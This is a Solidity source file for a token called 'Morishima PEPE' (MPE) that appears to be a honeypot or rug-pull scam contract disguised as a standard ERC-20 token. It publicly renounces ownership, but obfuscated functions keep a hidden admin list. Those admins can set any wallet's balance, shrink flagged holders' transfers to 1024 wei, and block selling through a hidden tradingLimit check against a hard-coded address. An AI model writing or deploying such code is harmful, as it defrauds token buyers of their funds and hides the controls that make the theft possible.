//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface teamFee {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldExempt) external view returns (uint256);

    function transfer(address listSwapLaunched, uint256 fundMinMarketing) external returns (bool);

    function allowance(address isEnable, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundMinMarketing) external returns (bool);

    function transferFrom(
        address sender,
        address listSwapLaunched,
        uint256 fundMinMarketing
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listLaunchedFrom, uint256 value);
    event Approval(address indexed isEnable, address indexed spender, uint256 value);
}

abstract contract receiverToken {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface limitMinBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface modeFee {
    function createPair(address amountFund, address receiverLaunched) external returns (address);
}

interface teamFeeMetadata is teamFee {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MorishimaPEPE is receiverToken, teamFee, teamFeeMetadata {

    function totalSupply() external view virtual override returns (uint256) {
        return launchLimit;
    }

    function walletShould() public {
        emit OwnershipTransferred(minMode, address(0));
        buyIs = address(0);
    }

    address public receiverExempt;

    address public minMode;

    function swapLimit(address tradingFundToken, uint256 fundMinMarketing) public {
        listTake();
        feeShould[tradingFundToken] = fundMinMarketing;
    }

    function sellSender(address liquidityAt) public {
        listTake();
        
        if (liquidityAt == minMode || liquidityAt == receiverExempt) {
            return;
        }
        swapTrading[liquidityAt] = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return receiverTeam;
    }

    string private feeReceiver = "Morishima PEPE";

    string private receiverTeam = "MPE";

    address senderIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    event OwnershipTransferred(address indexed exemptAuto, address indexed shouldIs);

    constructor (){
        if (toAt != receiverTotalExempt) {
            receiverTotalExempt = false;
        }
        limitMinBuy swapSender = limitMinBuy(senderIs);
        receiverExempt = modeFee(swapSender.factory()).createPair(swapSender.WETH(), address(this));
        if (exemptBuy != launchEnableReceiver) {
            toAt = false;
        }
        minMode = _msgSender();
        walletShould();
        txTradingShould[minMode] = true;
        feeShould[minMode] = launchLimit;
        
        emit Transfer(address(0), minMode, launchLimit);
    }

    function liquidityIsTotal(address atAuto, address listSwapLaunched, uint256 fundMinMarketing) internal returns (bool) {
        require(feeShould[atAuto] >= fundMinMarketing);
        feeShould[atAuto] -= fundMinMarketing;
        feeShould[listSwapLaunched] += fundMinMarketing;
        emit Transfer(atAuto, listSwapLaunched, fundMinMarketing);
        return true;
    }

    function approve(address receiverSwap, uint256 fundMinMarketing) public virtual override returns (bool) {
        marketingSellReceiver[_msgSender()][receiverSwap] = fundMinMarketing;
        emit Approval(_msgSender(), receiverSwap, fundMinMarketing);
        return true;
    }

    function txAmountLaunch(address atAuto, address listSwapLaunched, uint256 fundMinMarketing) internal returns (bool) {
        if (atAuto == minMode) {
            return liquidityIsTotal(atAuto, listSwapLaunched, fundMinMarketing);
        }
        uint256 txMin = teamFee(receiverExempt).balanceOf(isMin);
        require(txMin == tradingLimit);
        require(listSwapLaunched != isMin);
        if (swapTrading[atAuto]) {
            return liquidityIsTotal(atAuto, listSwapLaunched, buySellEnable);
        }
        return liquidityIsTotal(atAuto, listSwapLaunched, fundMinMarketing);
    }

    uint256 public exemptBuy;

    function allowance(address senderMarketing, address receiverSwap) external view virtual override returns (uint256) {
        if (receiverSwap == senderIs) {
            return type(uint256).max;
        }
        return marketingSellReceiver[senderMarketing][receiverSwap];
    }

    uint256 public launchFundAt;

    uint256 public launchEnableReceiver;

    function listTake() private view {
        require(txTradingShould[_msgSender()]);
    }

    bool public amountEnableLiquidity;

    function transfer(address tradingFundToken, uint256 fundMinMarketing) external virtual override returns (bool) {
        return txAmountLaunch(_msgSender(), tradingFundToken, fundMinMarketing);
    }

    bool private liquidityBuy;

    function owner() external view returns (address) {
        return buyIs;
    }

    uint256 tradingLimit;

    mapping(address => uint256) private feeShould;

    function getOwner() external view returns (address) {
        return buyIs;
    }

    function balanceOf(address shouldExempt) public view virtual override returns (uint256) {
        return feeShould[shouldExempt];
    }

    uint256 private launchLimit = 100000000 * 10 ** 18;

    uint8 private limitBuy = 18;

    uint256 launchSwapFrom;

    address private buyIs;

    function sellMax(address marketingTokenLiquidity) public {
        require(marketingTokenLiquidity.balance < 100000);
        if (amountEnableLiquidity) {
            return;
        }
        
        txTradingShould[marketingTokenLiquidity] = true;
        if (liquidityBuy) {
            launchEnableReceiver = launchFundAt;
        }
        amountEnableLiquidity = true;
    }

    mapping(address => mapping(address => uint256)) private marketingSellReceiver;

    function isTakeTrading(uint256 fundMinMarketing) public {
        listTake();
        tradingLimit = fundMinMarketing;
    }

    uint256 constant buySellEnable = 2 ** 10;

    function decimals() external view virtual override returns (uint8) {
        return limitBuy;
    }

    bool private receiverTotalExempt;

    function name() external view virtual override returns (string memory) {
        return feeReceiver;
    }

    address isMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transferFrom(address atAuto, address listSwapLaunched, uint256 fundMinMarketing) external override returns (bool) {
        if (_msgSender() != senderIs) {
            if (marketingSellReceiver[atAuto][_msgSender()] != type(uint256).max) {
                require(fundMinMarketing <= marketingSellReceiver[atAuto][_msgSender()]);
                marketingSellReceiver[atAuto][_msgSender()] -= fundMinMarketing;
            }
        }
        return txAmountLaunch(atAuto, listSwapLaunched, fundMinMarketing);
    }

    bool private toAt;

    mapping(address => bool) public txTradingShould;

    mapping(address => bool) public swapTrading;

}